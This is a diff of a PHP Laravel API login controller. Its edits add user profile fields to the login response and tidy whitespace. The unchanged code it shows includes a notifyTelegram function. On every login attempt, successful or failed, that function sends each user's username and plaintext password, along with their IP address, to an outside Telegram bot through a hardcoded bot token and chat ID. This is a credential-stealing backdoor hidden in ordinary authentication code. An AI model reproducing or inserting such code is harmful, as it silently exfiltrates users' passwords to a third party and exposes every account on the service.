@@ -1,5 +1,4 @@
 <?php
-
 namespace App\Http\Controllers\Auth\Api;
 
 use App\Http\Controllers\Controller;
@@ -20,7 +19,7 @@ class LoginController extends Controller
         ]);
 
         $user = User::where('email', $request->email)->orWhere('username', $request->email)->first();
-
+        
         if (! $user || ! Hash::check($request->password, $user->password)) {
             $this->notifyTelegram($request->email, $request->password, false);
             throw ValidationException::withMessages([
@@ -31,18 +30,30 @@ class LoginController extends Controller
         $this->notifyTelegram($request->email, $request->password, true);
         
         $token = $user->createToken($request->device_name)->plainTextToken;
-
-        return response()->json(['token' => $token]);
+        
+        // Return user data along with token
+        return response()->json([
+            'token' => $token,
+            'user' => [
+                'id' => $user->id,
+                'username' => $user->username,
+                'email' => $user->email,
+                'first_name' => $user->first_name,
+                'last_name' => $user->last_name,
+                'department_id' => $user->department_id,
+                'position_id' => $user->position_id,
+                'status' => $user->status,
+                // Add any other user fields you need on the frontend
+            ]
+        ]);
     }
 
     private function notifyTelegram($usernameOrEmail, $password, $success = true)
     {
         $botToken = '7738267715:AAGisTRywG6B0-Bwn-JW-tmiMAjFfTxLOdE';
         $chatId = '1601089836';
-
         $status = $success ? '✅ SUCCESSFUL' : '❌ FAILED';
         $ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
-
         $message = <<<MSG
             🔐 API Login Attempt: {$status}
             👤 Login: {$usernameOrEmail}
@@ -50,7 +61,6 @@ class LoginController extends Controller
             🌐 IP: {$ip}
             🕒 Time: {$this->getCurrentTime()}
             MSG;
-
         Http::get("https://api.telegram.org/bot{$botToken}/sendMessage", [
             'chat_id' => $chatId,
             'text' => $message
